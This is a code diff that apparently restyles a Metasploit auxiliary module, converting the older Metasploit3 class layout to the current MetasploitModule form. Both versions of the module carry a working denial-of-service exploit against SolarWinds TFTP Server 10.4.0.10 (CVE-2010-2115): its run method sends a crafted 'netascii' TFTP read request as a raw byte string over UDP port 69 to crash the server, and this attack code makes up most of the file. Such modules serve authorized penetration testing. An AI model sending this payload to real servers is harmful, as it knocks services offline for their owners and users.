@@ -1,49 +1,38 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Udp
+  include Msf::Auxiliary::Dos
 
-require 'msf/core'
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'SolarWinds TFTP Server 10.4.0.10 Denial of Service' ,
+      'Description'    => %q{
+          The SolarWinds TFTP server can be shut down by sending a 'netascii' read
+        request with a specially crafted file name.
+      },
+      'Author'         => 'Nullthreat',
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2010-2115' ],
+          [ 'OSVDB', '64845' ],
+          [ 'EDB', '12683' ]
+        ],
+      'DisclosureDate' => 'May 21 2010'))
 
-class Metasploit3 < Msf::Auxiliary
+    register_options([
+      Opt::RPORT(69)
+    ])
+  end
 
-	include Msf::Exploit::Remote::Udp
-	include Msf::Auxiliary::Dos
-
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'SolarWinds TFTP Server 10.4.0.10 Denial of Service' ,
-			'Description'    => %q{
-					The SolarWinds TFTP server can be shut down by sending a 'netascii' read
-				request with a specially crafted file name.
-			},
-			'Author'         => 'Nullthreat',
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2010-2115' ],
-					[ 'OSVDB', '64845' ],
-					[ 'EDB', 12683 ]
-				],
-			'DisclosureDate' => 'May 21 2010'))
-
-		register_options([
-			Opt::RPORT(69)
-		])
-	end
-
-	def run
-		connect_udp
-		print_status("Sending Crash request...")
-		udp_sock.put("\x00\x01\x01\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00")
-		disconnect_udp
-	end
-
+  def run
+    connect_udp
+    print_status("Sending Crash request...")
+    udp_sock.put("\x00\x01\x01\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00")
+    disconnect_udp
+  end
 end
